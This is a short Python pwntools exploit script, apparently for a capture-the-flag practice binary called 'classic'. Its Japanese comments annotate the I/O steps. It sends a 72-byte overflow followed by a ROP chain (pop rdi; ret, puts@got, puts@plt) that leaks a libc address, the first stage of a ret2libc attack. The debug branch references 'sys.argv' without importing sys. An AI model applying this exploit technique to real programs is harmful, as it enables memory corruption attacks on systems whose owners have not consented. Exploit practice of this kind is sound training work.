from pwn import *
from sys import argv

binary = "./classic"

elf = ELF("./classic")
libc = elf.libc

if len(argv) >= 2 and sys.argv[1] == "d":
    p = gdb.debug(binary, '''
        break *0x4006d6
        continue
    ''')
else:
    p = process(binary)

payload = b""
payload += b"A" * 72
payload += p64(0x400753)    # pop rdi ; ret  ;
payload += p64(0x601018)    # puts@got
payload += p64(0x400520)    # puts@plt

p.recvuntil("Local Buffer >> ")    # "Local Buffer >> "が来るまで読み込む
p.sendline(payload)                # ペイロードを送信
print(p.recv(1024))                # 1024byte受け取って出力

